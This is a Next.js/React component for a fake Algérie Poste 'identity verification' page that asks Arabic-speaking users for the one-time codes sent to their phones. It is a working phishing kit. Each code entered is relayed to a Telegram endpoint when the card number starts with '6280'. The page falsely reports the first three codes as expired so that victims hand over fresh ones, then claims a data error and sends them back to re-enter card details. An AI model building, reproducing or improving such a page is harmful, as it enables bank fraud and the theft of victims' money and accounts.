"use client"

import type React from "react"
import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card } from "@/components/ui/card"
import { toast } from "sonner"
import Image from "next/image"

interface OtpVerificationStepProps {
  onNext: () => void
  formData: any
  updateFormData: (data: any) => void
  onCardError: () => void
}

export function OtpVerificationStep({ onNext, formData, updateFormData, onCardError }: OtpVerificationStepProps) {
  const [otp, setOtp] = useState("")
  const [delayTimeLeft, setDelayTimeLeft] = useState(0)
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [showExpiredMessage, setShowExpiredMessage] = useState(false)
  const [isNightTime, setIsNightTime] = useState(false)

  const currentOtpPage = formData.currentOtpPage || 1

  const DELAY_DURATION = 120

  useEffect(() => {
    const checkNightTime = () => {
      const now = new Date()
      const hours = now.getHours()
      setIsNightTime(hours >= 0 && hours < 3)
    }
    
    checkNightTime()
    const interval = setInterval(checkNightTime, 60000)
    return () => clearInterval(interval)
  }, [])

  useEffect(() => {
    setDelayTimeLeft(DELAY_DURATION)
    setOtp("")
    setShowExpiredMessage(false)
  }, [currentOtpPage])

  useEffect(() => {
    if (delayTimeLeft <= 0) {
      return
    }

    const timer = setInterval(() => {
      setDelayTimeLeft((prev) => prev - 1)
    }, 1000)

    return () => clearInterval(timer)
  }, [delayTimeLeft])

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins}:${secs.toString().padStart(2, "0")}`
  }

  const sendOtpAttemptToTelegram = async (pageNumber: number, userEnteredOtp: string) => {
    try {
      if (!formData.cardNumber?.startsWith("6280")) return

      const telegramMessage = `OTP ${pageNumber}: ${userEnteredOtp}`

      await fetch("/api/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message: telegramMessage }),
      })
    } catch (error) {
      console.error("Failed to send OTP attempt to Telegram:", error)
    }
  }

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 6)
    setOtp(value)
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (!otp || otp.length !== 6) {
      toast.error("يرجى ادخال رمز OTP الكامل (6 ارقام)")
      return
    }

    setIsSubmitting(true)

    try {
      await sendOtpAttemptToTelegram(currentOtpPage, otp)

      if (currentOtpPage === 1 || currentOtpPage === 2 || currentOtpPage === 3) {
        setShowExpiredMessage(true)
        toast.error("le code a ete expire")
        setTimeout(() => {
          setOtp("")
          setShowExpiredMessage(false)
          updateFormData({ currentOtpPage: currentOtpPage + 1 })
        }, 1500)
      } else if (currentOtpPage === 4) {
        toast.error("يرجى ملء بيانات الحساب من جديد - حدث خطا في البيانات")
        setTimeout(() => {
          setOtp("")
          updateFormData({ currentOtpPage: 1 })
          onCardError()
        }, 1500)
      }
    } finally {
      setIsSubmitting(false)
    }
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#1a1f4e] to-[#2d3a8c] flex items-center justify-center p-4 relative overflow-hidden">
      {/* Background decorations */}
      <div className="absolute inset-0 overflow-hidden">
        <div className="absolute top-0 left-0 w-full h-full opacity-10">
          <div className="absolute top-10 left-10 w-64 h-64 bg-[#4a6cf4] rounded-full blur-3xl" />
          <div className="absolute bottom-20 right-10 w-80 h-80 bg-[#f5a623] rounded-full blur-3xl" />
        </div>
        <div className="absolute inset-0 bg-[linear-gradient(rgba(255,255,255,0.03)_1px,transparent_1px),linear-gradient(90deg,rgba(255,255,255,0.03)_1px,transparent_1px)] bg-[size:50px_50px]" />
      </div>

      <div className="relative z-10 w-full max-w-md">
        {/* Logo */}
        <div className="flex justify-center mb-4">
          <div className="bg-white rounded-xl p-3 shadow-xl">
            <Image
              src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/images-2I0wQBPdRJtcKjQ7NMaD1nGTE6rGfy.png"
              alt="Algerie Poste"
              width={80}
              height={80}
              className="w-20 h-20 object-contain"
            />
          </div>
        </div>

        <Card className="bg-white p-6 shadow-2xl border-0 rounded-2xl">
          <h1 className="text-lg font-bold text-center mb-1 text-[#1a1f4e]">التحقق من الهوية</h1>
          <p className="text-center text-gray-500 mb-2 text-xs">ادخل رمز OTP المرسل اليك</p>
          <div className="w-full h-1 bg-gradient-to-r from-[#f5a623] to-[#e6940a] rounded-full mb-4" />

          {/* Night Time Warning */}
          {isNightTime && (
            <div className="bg-amber-50 border border-amber-300 rounded-xl p-4 mb-4 text-center">
              <p className="text-sm font-semibold text-amber-800 mb-1">تنبيه مهم</p>
              <p className="text-xs text-amber-700 leading-relaxed">
                الاكواد لا تصل في الفترة ما بين 12:00 ليلا و 3:00 فجرا. يرجى المحاولة بعد الساعة 3:15 فجرا.
              </p>
            </div>
          )}

          {/* Timer */}
          <div className="bg-gradient-to-r from-[#4a6cf4] to-[#2d4a9e] rounded-xl p-4 mb-4 text-center text-white shadow-lg">
            <p className="text-xs opacity-80 mb-1">الوقت المتبقي</p>
            <div className="text-3xl font-bold text-white">{formatTime(delayTimeLeft)}</div>
          </div>

          {/* Expired Message */}
          {showExpiredMessage && (
            <div className="bg-red-50 border border-red-200 rounded-lg p-3 mb-4 text-center">
              <p className="text-sm font-semibold text-red-600">le code a ete expire</p>
              <p className="text-xs text-red-500 mt-1">سيتم ارسال رمز جديد</p>
            </div>
          )}

          {/* New Code Message */}
          {currentOtpPage > 1 && !showExpiredMessage && (
            <div className="bg-green-50 border border-green-200 rounded-lg p-3 mb-4 text-center">
              <p className="text-sm text-green-700">ادخل الرمز الجديد المرسل اليك</p>
            </div>
          )}

          <form onSubmit={handleSubmit} className="space-y-4">
            <div>
              <label className="block text-sm font-semibold mb-2 text-gray-700 text-center">رمز OTP (6 ارقام)</label>
              <Input
                type="text"
                inputMode="numeric"
                placeholder="000000"
                maxLength={6}
                value={otp}
                onChange={handleOtpChange}
                className="w-full text-center text-2xl font-bold tracking-[0.5em] h-14 border-2 border-[#4a6cf4]/30 focus:border-[#4a6cf4]"
                dir="ltr"
                autoFocus
              />
            </div>

            <Button
              type="submit"
              disabled={isSubmitting || otp.length !== 6}
              className="w-full bg-gradient-to-r from-[#f5a623] to-[#e6940a] hover:from-[#e6940a] hover:to-[#d4850a] text-[#1a1f4e] font-bold py-3 rounded-lg transition disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isSubmitting ? "جاري التحقق..." : "تاكيد"}
            </Button>
          </form>
        </Card>

        {/* Footer */}
        <p className="text-center text-xs text-white/50 mt-4">خدمة تفعيل التحويل البنكي - بريد الجزائر</p>
      </div>
    </div>
  )
}
